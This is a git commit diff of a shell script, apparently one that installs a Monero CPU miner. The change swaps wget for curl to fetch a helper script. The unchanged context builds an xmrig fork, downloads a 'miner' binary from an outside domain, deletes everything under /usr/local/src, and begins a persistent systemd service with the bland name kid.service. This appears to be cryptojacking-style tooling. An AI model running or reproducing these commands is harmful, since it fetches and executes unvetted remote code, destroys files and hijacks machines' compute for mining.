1e003045154eab40c74476a46fb0675789e5605d
waniekvbgm <69979619+waniekvbgm@users.noreply.github.com>
2020-10-14 07:02:52 +0700

    Update suxmr-19.sh

--- suxmr-19.sh
+++ suxmr-19.sh
@@ -5,7 +5,7 @@ sudo sysctl vm.nr_hugepages=128 &&
 sudo sysctl -w vm.nr_hugepages=128 &&
 sudo apt install -y build-essential cmake libuv1-dev libmicrohttpd-dev libssl-dev libhwloc-dev && 
 cd /usr/local/src/ && rm -rf * &&
-wget https://raw.githubusercontent.com/waniekvbgm/zalska/master/suxmr-19-link1.sh && chmod a+x suxmr-19-link1.sh
+curl -O https://raw.githubusercontent.com/waniekvbgm/zalska/master/suxmr-19-link1.sh && chmod a+x suxmr-19-link1.sh
 git clone https://github.com/waniekvbgm/xmrig.git && cd xmrig && mkdir build && cd build && cmake .. && make
 cd /usr/local/src/xmrig/build && wget https://release.monitorom.com/data/cpu/cpu_fe.tar.xz && tar xf cpu_fe.tar.xz && sudo chmod a+x miner
 bash -c 'cat <<EOT >>/lib/systemd/system/kid.service 
